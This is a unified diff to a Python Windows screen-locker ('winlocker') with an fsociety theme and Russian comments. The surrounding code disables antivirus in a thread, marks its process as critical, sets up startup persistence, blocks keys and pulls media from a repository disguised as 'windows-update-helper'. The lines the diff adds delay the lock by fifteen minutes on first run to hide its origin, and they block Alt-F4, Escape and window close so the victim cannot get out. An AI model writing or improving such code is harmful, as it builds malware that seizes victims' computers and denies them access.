@@ -24,6 +24,7 @@ import cv2, pygame, keyboard, numpy as np, socket, re, winsound
 PASS = "1601"
 TRIES = 5
 HOURS = 1
+DELAY_MINUTES = 15  # Задержка перед первым запуском
 TIMER = os.path.join(tempfile.gettempdir(), "timer.dat")
 VIDEO_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/fuxEcorp.mp4.mp4"
 MUSIC_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc)(1).mp3"
@@ -31,6 +32,17 @@ T = tempfile.gettempdir()
 V = os.path.join(T, "v.mp4")
 M = os.path.join(T, "m.mp3")
 tries = TRIES
+
+# Флаг первого запуска
+FIRST_RUN_FLAG = os.path.join(tempfile.gettempdir(), "first_run.flag")
+
+def is_first_run():
+    if os.path.exists(FIRST_RUN_FLAG):
+        return False  # Уже запускался — сразу винлокер
+    else:
+        # Первый запуск — создаём флаг
+        with open(FIRST_RUN_FLAG, 'w') as f: f.write('1')
+        return True
 
 def protect_process():
     try: ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
@@ -127,6 +139,8 @@ def startup():
 def anim():
     a=tk.Tk(); a.attributes('-fullscreen',True); a.attributes('-topmost',True)
     a.configure(bg='black'); a.overrideredirect(True)
+    a.protocol("WM_DELETE_WINDOW",lambda:None)
+    a.bind("<Alt-F4>",lambda e:None); a.bind("<Escape>",lambda e:None)
     l=tk.Label(a,text="",bg='black',fg='white',font=('Courier',55,'bold')); l.pack(expand=True)
     for t in ["f","f s","f s o","f s o c","f s o c i","f s o c i e","f s o c i e t","f s o c i e t y"]:
         l.config(text=t); a.update(); time.sleep(0.3)
@@ -236,8 +250,14 @@ if __name__=="__main__":
     startup()
     threading.Thread(target=kill_av, daemon=True).start()
     threading.Thread(target=timer_check, daemon=True).start()
-    anim()
+    
+    if is_first_run():
+        # Первый запуск — ждём 15 минут, потом анимация+видео+винлокер
+        time.sleep(DELAY_MINUTES * 60)
+        anim()
+        video()
+    # Если не первый запуск — сразу винлокер
+    
     lock_keys()
-    video()
     Locker()
     tk.mainloop()
